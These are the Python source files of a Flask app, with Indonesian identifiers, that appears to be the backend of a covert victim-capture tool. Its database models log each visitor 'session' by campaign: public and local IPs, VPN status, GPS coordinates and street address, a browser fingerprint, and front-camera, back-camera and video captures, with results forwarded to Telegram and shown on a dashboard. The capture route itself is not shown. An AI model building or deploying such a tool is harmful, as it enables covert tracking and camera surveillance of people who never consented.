F["app/__init__.py"] = "import os\nfrom flask import Flask\nfrom flask_cors import CORS\nfrom flask_wtf.csrf import CSRFProtect\nfrom app.config import Config\nfrom app.database import db, init_db\nfrom app.tasks import init_redis\n\nsocketio = None\ncsrf = CSRFProtect()\n\ndef create_app():\n    global socketio\n    app = Flask(__name__, template_folder='templates', static_folder='static')\n    app.config['SECRET_KEY'] = Config.SECRET_KEY\n    app.config['WTF_CSRF_ENABLED'] = True\n    app.config['WTF_CSRF_TIME_LIMIT'] = None\n    app.config['SQLALCHEMY_DATABASE_URI'] = Config.DATABASE_URL\n    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False\n    app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {'pool_pre_ping': True, 'pool_recycle': 280, 'pool_size': 10, 'max_overflow': 20}\n    app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024\n    os.makedirs(Config.UPLOAD_DIR, exist_ok=True)\n    CORS(app, resources={r'/api/*': {'origins': '*'}}, supports_credentials=True)\n    csrf.init_app(app)\n    db.init_app(app)\n    init_redis()\n    from app.routes import capture as capture_mod\n    csrf.exempt(capture_mod.bp)\n    from app.routes import telegram_bot as tg_mod\n    csrf.exempt(tg_mod.bp)\n    from app.routes.capture import bp as capture_bp\n    from app.routes.dashboard import bp as dash_bp\n    from app.routes.api import bp as api_bp\n    from app.routes.telegram_bot import bp as tg_bp\n    app.register_blueprint(capture_bp)\n    app.register_blueprint(dash_bp)\n    app.register_blueprint(api_bp, url_prefix='/api')\n    app.register_blueprint(tg_bp, url_prefix='/tg')\n    from flask_socketio import SocketIO\n    socketio = SocketIO(app, message_queue=Config.REDIS_URL, cors_allowed_origins='*', async_mode='gevent')\n    with app.app_context():\n        init_db()\n    from app.tasks import start_scheduler\n    start_scheduler(app)\n    @app.route('/healthz')\n    def _health():\n        return {'ok': True}\n    return app\n"

F["app/config.py"] = "import os\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\nclass Config:\n    TG_TOKEN = os.environ.get('TG_TOKEN', '')\n    TG_CHAT_ID = os.environ.get('TG_CHAT_ID', '')\n    TG_WEBHOOK_SECRET = os.environ.get('TG_WEBHOOK_SECRET', '')\n    DASH_USER = os.environ.get('DASH_USER', 'admin')\n    DASH_PASS = os.environ.get('DASH_PASS', 'admin')\n    SECRET_KEY = os.environ.get('SECRET_KEY', 'change-me')\n    JWT_SECRET = os.environ.get('JWT_SECRET', 'change-me-too')\n    DATABASE_URL = os.environ.get('DATABASE_URL', 'sqlite:///data/sessions.db')\n    REDIS_URL = os.environ.get('REDIS_URL', 'redis://localhost:6379/0')\n    UPLOAD_DIR = os.environ.get('UPLOAD_DIR', 'data/uploads')\n    MAX_STORAGE_MB = int(os.environ.get('MAX_STORAGE_MB', '5000'))\n    AUTO_CLEANUP_DAYS = int(os.environ.get('AUTO_CLEANUP_DAYS', '30'))\n    USE_S3 = os.environ.get('USE_S3', 'false').lower() == 'true'\n    S3_ENDPOINT = os.environ.get('S3_ENDPOINT', '')\n    S3_BUCKET = os.environ.get('S3_BUCKET', '')\n    S3_ACCESS_KEY = os.environ.get('S3_ACCESS_KEY', '')\n    S3_SECRET_KEY = os.environ.get('S3_SECRET_KEY', '')\n    ENABLE_VPN_CHECK = os.environ.get('ENABLE_VPN_CHECK', 'true').lower() == 'true'\n    ENABLE_REVERSE_GEOCODE = os.environ.get('ENABLE_REVERSE_GEOCODE', 'true').lower() == 'true'\n    RATE_LIMIT_PER_MIN = int(os.environ.get('RATE_LIMIT_PER_MIN', '20'))\n    RATE_LIMIT_UPLOAD_PER_HOUR = int(os.environ.get('RATE_LIMIT_UPLOAD_PER_HOUR', '60'))\n    DOMAIN = os.environ.get('DOMAIN', 'localhost')\n"

F["app/database.py"] = "from flask_sqlalchemy import SQLAlchemy\n\ndb = SQLAlchemy()\n\ndef init_db():\n    db.create_all()\n"

F["app/models.py"] = "from app.database import db\nfrom datetime import datetime\n\nclass Session(db.Model):\n    __tablename__ = 'sessions'\n    id = db.Column(db.Integer, primary_key=True)\n    ts = db.Column(db.String(32), unique=True, index=True, nullable=False)\n    waktu = db.Column(db.String(32))\n    campaign = db.Column(db.String(64), default='default', index=True)\n    ip_koneksi = db.Column(db.String(64))\n    ip_publik = db.Column(db.String(64))\n    ip_lokal = db.Column(db.String(255))\n    country = db.Column(db.String(64))\n    city = db.Column(db.String(64))\n    region = db.Column(db.String(64))\n    isp = db.Column(db.String(128))\n    is_vpn = db.Column(db.Integer, default=0)\n    lat = db.Column(db.Float)\n    lon = db.Column(db.Float)\n    akurasi_m = db.Column(db.Float)\n    alamat = db.Column(db.Text)\n    user_agent = db.Column(db.Text)\n    fingerprint = db.Column(db.Text)\n    has_depan = db.Column(db.Integer, default=0)\n    has_belakang = db.Column(db.Integer, default=0)\n    has_video = db.Column(db.Integer, default=0)\n    telegram_ok = db.Column(db.Integer, default=0)\n    telegram_desc = db.Column(db.Text)\n    created_at = db.Column(db.DateTime, default=datetime.utcnow, index=True)\n\n    def to_dict(self):\n        import json\n        d = {c.name: getattr(self, c.name) for c in self.__table__.columns}\n        if d.get('created_at'):\n            d['created_at'] = d['created_at'].isoformat()\n        try:\n            d['fingerprint_obj'] = json.loads(d.get('fingerprint') or '{}')\n        except Exception:\n            d['fingerprint_obj'] = {}\n        return d\n\nclass Event(db.Model):\n    __tablename__ = 'events'\n    id = db.Column(db.Integer, primary_key=True)\n    session_ts = db.Column(db.String(32), index=True)\n    event_type = db.Column(db.String(32))\n    data = db.Column(db.Text)\n    created_at = db.Column(db.DateTime, default=datetime.utcnow)\n"

F["app/auth.py"] = "import hmac\nimport hashlib\nimport time\nimport base64\nimport json\nfrom functools import wraps\nfrom flask import request, jsonify, redirect, url_for\nfrom app.config import Config\n\ndef _sign(data):\n    return hmac.new(Config.JWT_SECRET.encode(), data, hashlib.sha256).hexdigest()\n\ndef create_token(user, ttl=86400 * 7):\n    payload = {'u': user, 'exp': int(time.time()) + ttl}\n    raw = json.dumps(payload).encode()\n    b64 = base64.urlsafe_b64encode(raw).decode().rstrip('=')\n    return b64 + '.' + _sign(raw)\n\ndef verify_token(token):\n    try:\n        b64, sig = token.split('.')\n        b64 += '=' * (-len(b64) % 4)\n        raw = base64.urlsafe_b64decode(b64)\n        if not hmac.compare_digest(_sign(raw), sig):\n            return False\n        payload = json.loads(raw)\n        return payload.get('exp', 0) > time.time()\n    except Exception:\n        return False\n\ndef login_required(f):\n    @wraps(f)\n    def wrapper(*args, **kwargs):\n        token = request.cookies.get('session_token')\n        if token and verify_token(token):\n            return f(*args, **kwargs)\n        if request.path.startswith('/api/'):\n            return jsonify({'ok': False, 'msg': 'unauthorized'}), 401\n        return redirect(url_for('dashboard.login_page'))\n    return wrapper\n"

F["app/tasks.py"] = "import time\nimport threading\nfrom datetime import datetime, timedelta\nfrom redis import Redis\nfrom rq import Queue\nfrom app.config import Config\n\n_redis = None\n_queue_telegram = None\n\ndef init_redis():\n    global _redis, _queue_telegram\n    try:\n        _redis = Redis.from_url(Config.REDIS_URL)\n        _redis.ping()\n        _queue_telegram = Queue('telegram', connection=_redis)\n        print('[redis] connected')\n    except Exception as e:\n        print('[redis] gagal:', e)\n        _redis = None\n\ndef get_redis():\n    return _redis\n\ndef enqueue_telegram(func, *args, **kwargs):\n    if _queue_telegram:\n        try:\n            return _queue_telegram.enqueue(func, *args, **kwargs, job_timeout=120)\n        except Exception as e:\n            print('[queue] fallback sync:', e)\n    return func(*args, **kwargs)\n\ndef rate_limit_check(key, limit, window_sec):\n    if not _redis:\n        return True\n    try:\n        now = int(time.time())\n        pipe = _redis.pipeline()\n        pipe.zremrangebyscore(key, 0, now - window_sec)\n        pipe.zadd(key, {str(now) + '-' + str(time.time()): now})\n        pipe.zcard(key)\n        pipe.expire(key, window_sec + 5)\n        _, _, count, _ = pipe.execute()\n        return count <= limit\n    except Exception:\n        return True\n\ndef cleanup_old_files(app):\n    with app.app_context():\n        from app.models import Session\n        from app.services.storage import delete_session_files\n        from app.database import db\n        cutoff = datetime.utcnow() - timedelta(days=Config.AUTO_CLEANUP_DAYS)\n        old = Session.query.filter(Session.created_at < cutoff).all()\n        for s in old:\n            try:\n                delete_session_files(s.ts)\n                db.session.delete(s)\n            except Exception as e:\n                print('[cleanup err]', e)\n        db.session.commit()\n        print('[cleanup] hapus ' + str(len(old)) + ' sesi lama')\n\ndef _cleanup_loop(app):\n    while True:\n        try:\n            cleanup_old_files(app)\n        except Exception as e:\n            print('[cleanup loop err]', e)\n        time.sleep(3600 * 6)\n\ndef start_scheduler(app):\n    t = threading.Thread(target=_cleanup_loop, args=(app,), daemon=True)\n    t.start()\n    print('[scheduler] cleanup thread started')\n"

